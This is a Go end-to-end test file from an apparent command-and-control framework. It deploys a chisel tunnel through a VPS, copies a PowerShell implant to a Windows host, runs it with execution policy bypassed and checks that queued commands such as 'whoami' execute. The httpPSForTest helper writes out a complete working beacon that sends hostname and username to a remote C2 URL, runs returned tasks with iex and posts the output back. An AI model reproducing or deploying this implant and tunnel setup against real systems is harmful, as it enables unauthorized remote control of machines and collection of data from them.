package server

// C2 入站回调中继真机 E2E（默认 skip）：
// 平台 loopback HTTP C2 listener <- chisel <- VPS ingress <- Windows 133 植入端。

import (
	"context"
	"fmt"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"testing"
	"time"

	"github.com/Autumn-27/artex/db"
	"github.com/Autumn-27/artex/session"
	"github.com/Autumn-27/artex/stage"
	"github.com/Autumn-27/artex/tunnel"
)

func TestC2IngressWindowsE2E(t *testing.T) {
	dsn := strings.TrimSpace(os.Getenv("ARTEX_PG_DSN"))
	platformHost := strings.TrimSpace(os.Getenv("ARTEX_C2_INGRESS_PLATFORM_HOST"))
	platformPort := strings.TrimSpace(os.Getenv("ARTEX_C2_INGRESS_PLATFORM_PORT"))
	vpsSSH := strings.TrimSpace(os.Getenv("ARTEX_C2_INGRESS_VPS_SSH"))
	vpsKey := strings.TrimSpace(os.Getenv("ARTEX_C2_INGRESS_VPS_KEY"))
	vpsPublic := strings.TrimSpace(os.Getenv("ARTEX_C2_INGRESS_VPS_PUBLIC"))
	vpsPort := strings.TrimSpace(os.Getenv("ARTEX_C2_INGRESS_VPS_PORT"))
	winSSH := strings.TrimSpace(os.Getenv("ARTEX_C2_INGRESS_WIN_SSH"))
	winKey := strings.TrimSpace(os.Getenv("ARTEX_C2_INGRESS_WIN_KEY"))
	chiselPath := strings.TrimSpace(os.Getenv("ARTEX_CHISEL_PATH"))
	clientDir := strings.TrimSpace(os.Getenv("ARTEX_CHISEL_CLIENT_DIR"))
	if dsn == "" || platformHost == "" || platformPort == "" || vpsSSH == "" || vpsKey == "" || vpsPublic == "" || vpsPort == "" || winSSH == "" || winKey == "" || chiselPath == "" || clientDir == "" {
		t.Skip("需要 C2 ingress E2E 全套 env")
	}
	var pp, vp int
	if _, err := fmt.Sscanf(platformPort, "%d", &pp); err != nil || pp <= 0 {
		t.Fatalf("bad platform port")
	}
	if _, err := fmt.Sscanf(vpsPort, "%d", &vp); err != nil || vp <= 0 {
		t.Fatalf("bad vps port")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 390*time.Second)
	defer cancel()
	d, err := db.Open(dsn)
	if err != nil {
		t.Fatalf("open db: %v", err)
	}
	defer d.Close()
	store := db.NewC2Store(d, []byte("c2-ingress-e2e-master"))
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("pick port: %v", err)
	}
	c2Port := ln.Addr().(*net.TCPAddr).Port
	_ = ln.Close()
	token := fmt.Sprintf("ingress-e2e-%d", time.Now().UnixNano())
	lid, err := store.CreateListener(ctx, &db.C2Listener{Name: "ingress-e2e", Kind: "http", BindHost: "127.0.0.1", BindPort: c2Port, Token: token})
	if err != nil {
		t.Fatalf("create c2 listener: %v", err)
	}
	t.Cleanup(func() { _ = store.DeleteListener(context.Background(), lid) })
	l, err := store.GetListener(ctx, lid)
	if err != nil || l == nil {
		t.Fatalf("get listener: %v", err)
	}
	rt := &c2Runtime{store: store, httpServers: map[int64]*http.Server{}}
	if err := rt.startHTTPOne(ctx, l); err != nil {
		t.Fatalf("start c2 http: %v", err)
	}
	t.Cleanup(func() { rt.stopHTTPOne(context.Background(), lid) })
	keyPEM, err := os.ReadFile(vpsKey)
	if err != nil {
		t.Fatalf("read vps key: %v", err)
	}
	parts := strings.SplitN(vpsSSH, "@", 2)
	if len(parts) != 2 {
		t.Fatalf("bad vps ssh")
	}
	vpsSess, err := session.DialSSH(session.SSHSecret{Host: parts[1], User: parts[0], Key: string(keyPEM), Port: 22}, 20*time.Second)
	if err != nil {
		t.Fatalf("dial vps: %v", err)
	}
	vpsSess.SetID(1)
	reg := session.NewRegistry()
	reg.Add(vpsSess)
	stageMgr, err := stage.New(ctx, t.TempDir())
	if err != nil {
		t.Fatalf("stage: %v", err)
	}
	stagePort := 0
	if v := strings.TrimSpace(os.Getenv("ARTEX_TUNNEL_STAGE_PORT")); v != "" {
		_, _ = fmt.Sscanf(v, "%d", &stagePort)
	}
	tmgr, err := tunnel.NewManager(tunnel.Options{
		Store: db.NewTunnelStore(d), Stage: stageMgr, Sessions: reg,
		ChiselPath: chiselPath, ChiselClientDir: clientDir, StagePort: stagePort, DataDir: t.TempDir(),
	})
	if err != nil {
		t.Fatalf("tunnel manager: %v", err)
	}
	plan, err := tunnel.PlanIngress(&tunnel.PlanOpts{
		TaskID: 1, ViaSessionID: 1, ListenHost: "0.0.0.0", ListenPort: vp,
		CallbackHost: platformHost, PlatformChiselPort: pp,
		C2CallbackHost: vpsPublic, C2ListenerID: lid,
		TargetHost: "127.0.0.1", TargetPort: c2Port,
		DataDir: tmgr.PlanDataDir(),
	})
	if err != nil {
		t.Fatalf("plan ingress: %v", err)
	}
	rec, err := tmgr.Deploy(ctx, plan)
	if err != nil {
		t.Fatalf("deploy ingress: %v", err)
	}
	t.Logf("ingress tunnel alive id=%d state=%s vps=%s:%d platform=%s:%d", rec.ID, rec.State, vpsPublic, vp, platformHost, pp)
	defer func() { _ = tmgr.Teardown(context.Background(), rec.ID) }()
	baseURL := "http://" + net.JoinHostPort(vpsPublic, fmt.Sprint(vp))
	payload := httpPSForTest(baseURL, token)
	local := "/tmp/c2_ingress_target.ps1"
	if err := os.WriteFile(local, []byte(payload), 0o600); err != nil {
		t.Fatal(err)
	}
	scp := exec.Command("scp", "-i", winKey, "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no", local, winSSH+":C:/Users/wantong/c2_ingress_target.ps1")
	if out, err := scp.CombinedOutput(); err != nil {
		t.Fatalf("scp win: %v %s", err, out)
	}
	winCmd := exec.Command("ssh", "-i", winKey, "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no", winSSH,
		"powershell -NoProfile -ExecutionPolicy Bypass -File C:\\Users\\wantong\\c2_ingress_target.ps1")
	winLog, _ := os.Create("/tmp/c2_ingress_win.log")
	winCmd.Stdout, winCmd.Stderr = winLog, winLog
	if err := winCmd.Start(); err != nil {
		t.Fatalf("start win implant: %v", err)
	}
	t.Logf("windows implant ssh pid=%d", winCmd.Process.Pid)
	defer func() {
		if winCmd.Process != nil {
			_ = winCmd.Process.Kill()
			_, _ = winCmd.Process.Wait()
		}
		_ = winLog.Close()
		_, _ = exec.Command("ssh", "-i", winKey, "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no", winSSH, "del C:\\Users\\wantong\\c2_ingress_target.ps1 >NUL 2>&1").CombinedOutput()
	}()
	var sess *db.C2Session
	deadline := time.Now().Add(60 * time.Second)
	for time.Now().Before(deadline) {
		list, _ := store.ListSessions(ctx, true)
		for _, x := range list {
			if x.ListenerID == lid {
				sess = x
				break
			}
		}
		if sess != nil {
			break
		}
		time.Sleep(1 * time.Second)
	}
	if sess == nil {
		logs, _ := exec.Command("ssh", "-i", winKey, "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no", winSSH, "type C:\\Users\\wantong\\c2_ingress_diag.log 2>NUL & type C:\\Users\\wantong\\c2_ingress_err.log 2>NUL & type C:\\Users\\wantong\\c2_ingress_out.log 2>NUL").CombinedOutput()
		t.Fatalf("windows implant did not reach loopback C2 via VPS ingress; logs=%s", logs)
	}
	t.Logf("c2 session via ingress id=%d remote=%s user=%s", sess.ID, sess.RemoteAddr, sess.Username)
	tid, err := store.CreateTask(ctx, sess.ID, "exec", "whoami; hostname", "ingress-e2e")
	if err != nil {
		t.Fatalf("queue task: %v", err)
	}
	var task *db.C2Task
	deadline = time.Now().Add(45 * time.Second)
	for time.Now().Before(deadline) {
		task, _ = store.GetTask(ctx, tid)
		if task != nil && (task.Status == db.C2TaskSuccess || task.Status == db.C2TaskFailed) {
			break
		}
		time.Sleep(1 * time.Second)
	}
	if task == nil || task.Status != db.C2TaskSuccess || strings.TrimSpace(task.Output) == "" {
		t.Fatalf("task result: %+v", task)
	}
	t.Logf("c2 ingress task ok output=%q", strings.TrimSpace(task.Output))
}

func httpPSForTest(baseURL, token string) string {
	return fmt.Sprintf(`$BASE=%q; $TOKEN=%q; $UUID='ingress-win-e2e'; $LOG='C:\Users\wantong\c2_ingress_diag.log'
Add-Content $LOG ('START '+ (Get-Date).ToString('o'))
function Post($b) {
  try {
    $r = Invoke-RestMethod -Uri ($BASE.TrimEnd('/')+'/c2/beacon/'+$TOKEN) -Method Post -ContentType 'application/json' -Body ($b|ConvertTo-Json -Compress) -TimeoutSec 20
    Add-Content $LOG ('RESP '+(($r|ConvertTo-Json -Compress)))
    return $r
  } catch { Add-Content $LOG ('ERR '+$_.Exception.Message); return $null }
}
while ($true) {
  $r = Post @{implant_uuid=$UUID; hostname=$env:COMPUTERNAME; os='windows'; arch='ps'; username=$env:USERNAME}
  if ($r -and $r.task) {
    try { $out = iex $r.task.args 2>&1 | Out-String } catch { $out = '' }
    Post @{implant_uuid=$UUID; task_id=$r.task.id; ok=$true; output=$out}
  }
  Start-Sleep -Seconds 1
}`, baseURL, token)
}
